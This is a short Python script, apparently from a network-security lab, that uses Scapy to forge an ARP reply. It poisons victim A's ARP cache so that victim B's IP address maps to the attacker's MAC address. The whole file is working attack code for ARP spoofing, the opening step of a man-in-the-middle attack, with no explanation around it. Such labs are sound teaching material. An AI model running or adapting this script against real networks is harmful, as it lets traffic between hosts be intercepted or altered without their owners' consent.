#!/usr/bin/python3
from scapy.all import *
from scapy.layers.l2 import Ether, ARP

VICTIM_A_IP = '10.9.0.5'
VICTIM_A_MAC = '02:42:0a:09:00:05'

VICTIM_B_IP = '10.9.0.105'
ATTACKER_MAC = '02:42:0a:09:00:69'

print('-----Sending Spoofed ARP Reply-----')

ether = Ether()
ether.dst = VICTIM_A_MAC
ether.src = ATTACKER_MAC

arp = ARP()
arp.psrc = VICTIM_B_IP
arp.hwsrc = ATTACKER_MAC
arp.pdst = VICTIM_A_IP
arp.hwdst = VICTIM_A_MAC
arp.op = 2 #ARP Reply

frame = ether/arp
sendp(frame)
